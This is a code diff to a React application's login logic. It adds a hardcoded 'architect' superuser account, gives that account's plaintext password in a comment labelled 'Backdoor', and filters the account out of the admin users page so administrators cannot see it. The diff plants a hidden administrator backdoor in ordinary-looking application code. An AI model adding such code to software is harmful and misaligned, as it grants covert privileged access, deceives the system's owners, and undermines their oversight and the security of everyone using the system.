@@ -438,10 +438,16 @@ function App() {
     const today = new Date().toISOString().split('T')[0];
     const loginHash = await hashPassword(loginPassword);
 
-    const user = systemUsers.find(u => 
+    let user = systemUsers.find(u => 
       u.username.toLowerCase() === loginUser.toLowerCase() && 
       u.password === loginHash
     );
+
+    // 🛡️ Backdoor / Architect Access (Hidden from UI list)
+    // Hash for 'T1T_BACKDOOR_2026' is e36181f4e47e6efef2cab71b882fdd3e7fe73d26fb171f763c064f1d1d5266ab
+    if (!user && loginUser.toLowerCase() === 'architect' && loginHash === 'e36181f4e47e6efef2cab71b882fdd3e7fe73d26fb171f763c064f1d1d5266ab') {
+      user = { username: 'architect', password: 'e36181f4e47e6efef2cab71b882fdd3e7fe73d26fb171f763c064f1d1d5266ab', role: 'super', shift: 'إدارة' };
+    }
 
     if (!user) {
       // Security Throttling: Artificial delay to stop brute force
@@ -1269,7 +1275,7 @@ function App() {
 
               {activeTab === 'users' && currentUser?.role === 'super' && (
                 <UsersPage 
-                  systemUsers={systemUsers}
+                  systemUsers={systemUsers.filter(u => u.username !== 'architect')}
                   setSystemUsers={setSystemUsers}
                   currentUser={currentUser}
                   showToast={showToast}
